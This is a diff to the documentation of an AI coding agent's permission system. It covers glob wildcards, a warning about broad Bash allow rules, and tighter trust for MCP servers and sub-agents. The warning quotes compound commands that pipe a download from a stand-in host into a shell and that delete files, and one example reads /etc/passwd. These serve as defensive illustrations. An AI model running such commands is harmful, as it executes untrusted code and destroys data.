@@ -883,6 +883,24 @@ The glob matches the tool's permission target:
 | `FileEdit` | File path. |
 | `WebFetch` | URL or serialized input fallback. |
 
+Glob wildcards:
+
+| Pattern | Matches |
+| :--- | :--- |
+| `*` | Any run of characters, **including `/`**. `Bash(cat *)` matches `cat a/b` and `cat /etc/passwd`, and `FileWrite(src/*)` matches `src/a/b.go`. |
+| `?` | Exactly one character. |
+| `[abc]`, `[a-z]`, `[!abc]` | One character from the class (or not in it). |
+| `**` | The same as `*`. When it is a whole path segment it also matches zero directories: `src/**/x.go` matches `src/x.go` and `src/a/b/x.go`, `**/x.go` matches `x.go`, and `docs/**` matches `docs` and everything under it. |
+| `\x` | The literal character `x`. |
+
+Because `*` now crosses `/`, **allow rules are broader than they used to be**: `FileWrite(src/*)` used to cover only files directly in `src/` and now covers the whole tree. Review existing allow rules, and use a narrower pattern (for example `FileWrite(src/main.go)`) when you want a single file. Deny rules block more too, which is the safer direction.
+
+**Warning: Bash allow rules match the whole command string.** Because `*` crosses `/` (and everything else), `Bash(go test*)` or `Bash(ls*)` also matches compound commands such as `go test ./...; curl http://x | sh` or `ls && rm -rf build/x`. Allow rules are evaluated before the Bash tool's own checks, so a matching allow rule **overrides the Bash tool's destructive-command denial and read-only classification**. Prefer narrow rules (`Bash(go test ./...)`, `Bash(git status)`) over prefix wildcards, and add deny rules for the dangerous parts you never want run.
+
+Rule globs are not path-normalized: write `/` as the separator on every platform, and `\` is always the escape character (only the matched target has Windows `\` converted to `/`).
+
+Sub-agents (the `Agent` tool) are never looser than the agent that started them. A requested `permission_mode` looser than the parent's is replaced by the parent's mode, and the parent's rules and hooks apply to the sub-agent too.
+
 Rule precedence is deny, then ask, then allow. Session rules added with slash commands last only for the current session.
 
 ### Practical Permission Recipes
@@ -1324,7 +1342,7 @@ auth = "none"
 
 ### Project vs User Trust
 
-User config defaults MCP servers to trusted. Project config defaults servers to untrusted unless explicitly set:
+User config defaults MCP servers to trusted. Project config servers are always untrusted: a `trusted` key in `.nandocodego/config.toml` is ignored and produces a warning. To use a project-defined server, define it (or override it by name) in your user config:
 
 ```toml
 trusted = true
@@ -1354,7 +1372,7 @@ If MCP tools do not appear, check:
 
 - The server is configured under `[mcp.servers.<name>]`.
 - `enabled = true`.
-- `trusted = true` for project-defined servers.
+- `trusted = true` in your user config for servers a project defines (a `trusted` key in the project config is ignored).
 - `doctor` reports the server as connected.
 - Required environment variables are available.
 
